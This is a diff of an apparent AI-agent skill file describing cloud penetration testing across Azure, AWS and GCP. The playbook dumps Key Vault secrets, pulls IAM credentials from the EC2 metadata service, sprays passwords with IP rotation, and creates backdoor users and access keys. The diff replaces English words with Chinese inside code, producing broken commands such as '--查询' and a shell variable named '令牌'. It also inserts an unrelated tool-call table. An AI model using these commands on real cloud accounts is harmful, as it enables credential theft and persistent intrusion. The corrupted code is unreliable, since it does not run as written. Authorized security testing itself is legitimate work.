@@ -13,7 +13,7 @@ date_added: "2026-02-27"
 
 ## 目的
 
-Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.
+Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, 认证 testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.
 
 ## 前提条件
 
@@ -43,11 +43,11 @@ pip install scoutsuite pacu
 ### 必需 Knowledge
 - Cloud architecture fundamentals
 - Identity and Access Management (IAM)
-- API authentication mechanisms
+- API 认证 mechanisms
 - DevOps and automation concepts
 
 ### 必需 Access
-- Written authorization for testing
+- Written 授权 for testing
 - Test credentials or access tokens
 - Defined scope and rules of engagement
 
@@ -69,7 +69,7 @@ Gather initial information about target cloud presence:
 curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
 
 # Azure: Get Tenant ID
-curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"
+curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-配置"
 
 # Enumerate cloud resources by company name
 python3 cloud_enum.py -k targetcompany
@@ -78,7 +78,7 @@ python3 cloud_enum.py -k targetcompany
 cat ips.txt | python3 ip2provider.py
 ```
 
-### Phase 2: Azure Authentication
+### Phase 2: Azure 认证
 
 Authenticate to Azure environments:
 
@@ -172,9 +172,9 @@ $vms = Get-AzVM
 $vms.UserData
 
 # Dump Key Vault secrets
-az keyvault list --query '[].name' --output tsv
+az keyvault list --查询 '[].name' --output tsv
 az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
-az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
+az keyvault secret list --vault-name <vault> --查询 '[].id' --output tsv
 az keyvault secret show --id <URI>
 ```
 
@@ -201,7 +201,7 @@ Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
 ```
 
-### Phase 6: AWS Authentication
+### Phase 6: AWS 认证
 
 Authenticate to AWS environments:
 
@@ -257,20 +257,20 @@ Exploit AWS misconfigurations:
 
 ```bash
 # Check for public RDS snapshots
-aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
+aws rds describe-db-snapshots --snapshot-type manual --查询=DBSnapshots[*].DBSnapshotIdentifier
 aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
 # AttributeValues = "all" means publicly accessible
 
 # Extract Lambda environment variables (may contain secrets)
-aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
+aws lambda get-function --function-name <name> | jq '.配置.Environment'
 
 # Access metadata service (from compromised EC2)
 curl http://169.254.169.254/latest/meta-data/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # IMDSv2 access
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
+令牌=$(curl -X PUT "http://169.254.169.254/latest/api/令牌" -H "X-aws-ec2-metadata-令牌-ttl-seconds: 21600")
+curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-令牌: $令牌"
 ```
 
 ### Phase 9: AWS Persistence
@@ -286,7 +286,7 @@ aws iam create-access-key --user-name <username>
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
-    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
+    aws ec2 describe-instances --查询=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
 done
 ```
 
@@ -295,7 +295,7 @@ done
 Discover GCP resources:
 
 ```bash
-# Authentication
+# 认证
 gcloud auth login
 gcloud auth activate-service-account --key-file creds.json
 gcloud auth list
@@ -362,6 +362,14 @@ gcloud auth list
 
 ## 快速参考
 
+| 操作 | 方法 |
+|---|---|
+| 发现工具 | 调用 `RUBE_SEARCH_TOOLS` |
+| 检查连接 | 调用 `RUBE_MANAGE_CONNECTIONS` |
+| 执行工具 | 调用 `RUBE_MULTI_EXECUTE_TOOL` |
+| 处理分页 | 检查响应中的 `cursor` 字段 |
+| 错误处理 | 验证连接状态和架构合规性 |
+
 ### Azure Key Commands
 
 | Action | Command |
@@ -422,7 +430,7 @@ gcloud auth list
 ## 约束条件 and 限制
 
 ### Legal 需求
-- Only test with explicit written authorization
+- Only test with explicit written 授权
 - Respect scope boundaries between cloud accounts
 - Do not access production customer data
 - Document all testing activities
@@ -447,7 +455,7 @@ gcloud auth list
 
 ```powershell
 # Using MSOLSpray with FireProx for IP rotation
-# First create FireProx endpoint
+# First create FireProx 端点
 python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create
 
 # Spray passwords
@@ -498,7 +506,7 @@ gcloud beta compute ssh instance-name --zone us-central1-a --project target-proj
 
 | Issue | Solutions |
 |-------|-----------|
-| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
+| 认证 failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
 | Permission denied | List current roles; try different resources; check resource policies; verify region |
 | Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
 | Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |
@@ -508,4 +516,4 @@ gcloud beta compute ssh instance-name --zone us-central1-a --project target-proj
 - [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation
 
 ## 何时使用
-This skill is applicable to execute the workflow or actions described in the overview.
+This skill is applicable to execute the 工作流 or actions described in the overview.
